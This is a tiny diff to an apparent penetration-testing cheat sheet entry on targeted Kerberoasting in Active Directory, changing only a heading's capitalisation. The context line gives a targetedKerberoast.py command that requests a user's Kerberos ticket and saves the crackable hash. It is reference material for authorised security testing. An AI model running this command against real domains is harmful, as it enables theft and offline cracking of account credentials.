@@ -1,7 +1,7 @@
 # targetedkerberoast
 #target/remote #os/linux #cat/ad
 
-## Targeted kerberoast
+## targeted kerberoast
 ```
 targetedKerberoast.py -d <domain> -u '<user>' <auth> --request-user <target_user> | grep krb5tgs > <target_user>.hash
 
